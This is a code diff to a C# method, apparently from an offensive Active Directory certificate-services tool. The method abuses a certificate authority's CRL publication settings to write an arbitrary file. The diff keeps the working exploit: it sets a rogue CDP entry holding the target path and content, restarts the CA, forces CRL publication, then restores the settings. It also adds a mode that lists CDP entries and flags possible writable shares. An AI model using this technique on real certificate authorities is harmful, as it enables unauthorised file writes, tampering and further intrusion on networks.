@@ -112,7 +112,7 @@ namespace Certify.Lib
         }
 
         // change the ca cdp list to write a file in an arbitrary location
-        public static void WriteFile(string CA, string path, string input)
+        public static void WriteFile(string CA, string path, string input, bool read = false)
         {
             Console.WriteLine($"\r\n[*] Certificate Authority   : {CA}");
 
@@ -121,31 +121,49 @@ namespace Certify.Lib
             // we obtain the current cdp list in order to restore the configuration after the file is written
             string[] currentCDP = (string[])objCertAdmin.GetConfigEntry(CA, "", "CRLPublicationURLs");
 
-            // the file's path and content are written to the registry
-            var rogueCDP = new string[] { $"1:file://{path}" , $"71:%n{input}%n"};
-            objCertAdmin.SetConfigEntry(CA, @"", "CRLPublicationURLs", rogueCDP);
-            restartCA(CA);
-
-            Thread.Sleep(3000);
-
-            objCertAdmin = new CERTADMINLib.CCertAdmin();
-            try
+            // In readonly mode, we just print the current cdp list to look for writable remote shares
+            if (read)
             {
-                /* 
-                 * this forces the CA to publish a crl in the path pointed by the cdp list. Since we have set the file's content 
-                 * as cdp, this call will most likely fail (since it's "corrupted" data, not a valid path) but it will write the arbitrary file in the
-                 * desired location.
-                 */
-                objCertAdmin.PublishCRL(CA, new DateTime());
+                Console.WriteLine("\r\n[*] Actual CDP list:");
+                foreach (var cdp in currentCDP)
+                {
+                    var values = cdp.Split(new[] { ':' }, 2);
+                    Console.WriteLine("\t[-] {0}", values[1]);
+                    if(values[1].Contains("file://"))
+                    {
+                        Console.WriteLine("\t    \\ Possible writable share!");
+                    }
+                }
             }
-            catch { }
+            else
+            {
 
-            Console.WriteLine("\r\n[*] The file has been written!");
+                // the file's path and content are written to the registry
+                var rogueCDP = new string[] { $"1:file://{path}", $"4:%n{input}%n" };
+                objCertAdmin.SetConfigEntry(CA, @"", "CRLPublicationURLs", rogueCDP);
+                restartCA(CA);
 
-            // the old cdp list is restored
-            objCertAdmin.SetConfigEntry(CA, @"", "CRLPublicationURLs", currentCDP);
+                Thread.Sleep(3000);
 
-            restartCA(CA);
+                objCertAdmin = new CERTADMINLib.CCertAdmin();
+                try
+                {
+                    /* 
+                     * this forces the CA to publish a crl in the path pointed by the cdp list. Since we have set the file's content 
+                     * as cdp, this call will most likely fail (since it's "corrupted" data, not a valid path) but it will write the arbitrary file in the
+                     * desired location.
+                     */
+                    objCertAdmin.PublishCRL(CA, new DateTime());
+                }
+                catch { }
+
+                Console.WriteLine("\r\n[*] The file has been written!");
+
+                // the old cdp list is restored
+                objCertAdmin.SetConfigEntry(CA, @"", "CRLPublicationURLs", currentCDP);
+
+                restartCA(CA);
+            }
         }
 
         public static void restartCA(string CA)
